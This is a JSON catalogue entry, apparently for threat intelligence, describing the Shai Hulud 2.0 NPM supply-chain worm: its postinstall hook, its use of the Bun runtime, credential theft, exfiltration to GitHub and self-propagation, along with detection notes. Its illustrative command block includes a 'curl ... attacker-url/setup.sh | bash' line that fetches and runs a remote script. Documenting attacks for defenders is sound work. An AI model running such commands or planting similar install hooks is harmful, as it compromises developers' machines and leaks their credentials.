{
    "title": "Shai Hulud 2.0: NPM Supply Chain Worm",
    "description": "A sophisticated supply chain attack targeting NPM users. It leverages the Bun runtime for stealthy execution, harvests cloud credentials, exfiltrates data to GitHub, and attempts self-propagation by publishing malicious packages using stolen tokens.",
    "shortDescription": "NPM worm utilizing Bun runtime and GitHub",
    "tags": [
        "Supply_Chain",
        "NPM",
        "Bun",
        "Worm",
        "Credential_Dumping",
        "Exfiltration",
        "GitHub",
        "JavaScript"
    ],
    "version": "3.0",
    "metadata": {
        "descriptionHtml": "<p><span style="color:#ef4444;font-weight:bold;">Shai Hulud 2.0</span> is an advanced NPM supply chain attack that functions as a worm. It distinguishes itself by installing and using the <span style="color:#ef4444;font-weight:bold;">Bun runtime</span> to execute malicious JavaScript, likely to evade detections tuned for Node.js.</p><ol><li>Attacker publishes a malicious package to the NPM registry.</li><li>When a victim runs <span style="color:#ef4444;font-weight:bold;">npm install</span>, a <strong>postinstall hook</strong> triggers.</li><li>The script detects or installs the <strong>Bun runtime</strong>.</li><li>It executes the payload using Bun, harvesting sensitive files (AWS keys, SSH keys, NPM tokens).</li><li>Data is exfiltrated to an attacker-controlled <strong>GitHub repository</strong> (using it as C2/Dead Drop).</li><li>The malware uses stolen NPM tokens to publish further malicious packages, propagating the worm.</li></ol>",
        "commandsBlock": "# Step 1: Attacker publishes the initial carrier package\n$ npm publish @malicious/shai-hulud\n\n# Step 2: Victim executes installation\n$ npm install @malicious/shai-hulud\n\n# Step 3: Malicious postinstall hook triggers (simplified)\n$ curl -sL http://attacker-url/setup.sh | bash\n\n# Step 4: Malware uses Bun to run payload\n$ ~/.bun/bin/bun run payload.js\n\n# Step 5: Exfiltration to GitHub\n$ git push origin main",
        "toolSource": "NPM Registry (Malicious Package), GitHub (C2 Infrastructure)",
        "prerequisites": [
            "Victim must install the compromised/typosquatted package",
            "Outbound network access to GitHub and NPM",
            "Write access to victim's file system (standard for npm install)"
        ],
        "attackerGains": [
            "Cloud credentials (AWS, Azure, GCP)",
            "Source code and intellectual property",
            "NPM publishing tokens (for propagation)",
            "CI/CD pipeline access"
        ],
        "detectionNotes": [
            "Unexpected installation of Bun runtime (~/.bun)",
            "Unusual outbound traffic to random GitHub repositories during npm install",
            "Modification of package.json scripts in unrelated projects",
            "Process execution tree showing 'bun' spawned from 'npm'"
        ],
        "mitreCategories": [
            "T1195.001",
            "T1059.007",
            "T1567.001",
            "T1552.001",
            "T1583.006"
        ]
    },
